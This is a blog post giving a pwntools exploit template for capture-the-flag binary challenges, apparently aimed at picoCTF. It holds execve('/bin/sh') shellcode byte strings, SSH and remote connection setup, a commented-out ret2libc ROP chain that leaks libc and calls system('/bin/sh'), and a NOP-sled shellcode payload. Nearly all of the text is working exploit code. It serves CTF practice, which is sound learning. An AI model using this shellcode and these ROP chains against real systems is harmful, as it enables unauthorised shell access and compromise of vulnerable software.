---
layout: post
title: Pwntools template
categories: Pwn
---


```python

from pwn import *
import struct
import os

## RANDOM TOOLS ##
s1 = b'\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05'
s2 = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
s3 = b"\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c\x58\x0f\x05"
abcd = 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ'


## VARIABLES ##
host = "mercury.picoctf.net"
port = 1234

remoteuser = ""
remotepass = ""
remotecwd = "/problems/path"

basepath = os.getcwd()
binarypath = basepath + '/vuln'
libcpath = basepath + '/libc.so.6'
ldpath = basepath + '/ld-2.27.so'

debug = False
debugger = True
# shell, remote, local, libc
mode = "local"


## Setup ##

elf = context.binary = ELF(binarypath)
libc = ELF(libcpath)
ld = ELF(ldpath)

p = None
if mode == "shell":
    debugger = False
    shell = ssh(host=host, user=remoteuser, password=remotepass)
    p = shell.process([binarypath], cwd=remotecwd)
if mode == 'remote':
    debugger = False
    p = remote(host, port)
if mode == 'local':
    p = process([ld.path, binarypath], env={'LD_PRELOAD':libcpath})
if mode == 'libc':
    libc = elf.libc
    p = process(binarypath)

if debug:
    context.log_level = 'debug'
if debugger: 
    pid = gdb.attach(p, "\
        define hook-stop \n\
            i r $rbp \n\
            i r $rip \n\
            x/8i $pc \n\
            x/64x $sp \n\
        end \n")

## ROP ##
'''
rop1 = ROP(elf)
rop1.puts(elf.got['puts'])
rop1.call(elf.symbols['main'])
print(rop1.dump())
OFFSET = b'A'*40
p.recvuntil('MESSAGE\n')
p.sendline(OFFSET + rop1.chain())

# Grab the first 8 bytes of our output buffer
leaked_puts = p.recvuntil('\n')[:8].strip().ljust(8, b'\x00')
# Convert to integer
leaked_puts = struct.unpack('Q', leaked_puts)[0]
# Rebase libc to the leaked offset
libc.address = leaked_puts - libc.symbols['puts']
log.info('Libc address: {}'.format(hex(libc.address)))

# Create new ROP object with rebased libc
rop2 = ROP(libc)
# Call system('/bin/sh')
rop2.system(next(libc.search(b'/bin/sh\x00')))
print(rop2.dump())

p.recvuntil(('MESSAGE\n'))
p.sendline(b'B'*40 + rop2.chain())
'''


## Shellcode ##
'''
shellcode = b'\xCC' + s3
padding_size = 1111
full_payload =  b"\x90"*(padding_size-len(shellcode)) + shellcode+ b"ZBBBBBBB" + p64(address+23)
p.sendline(full_payload)
'''

```
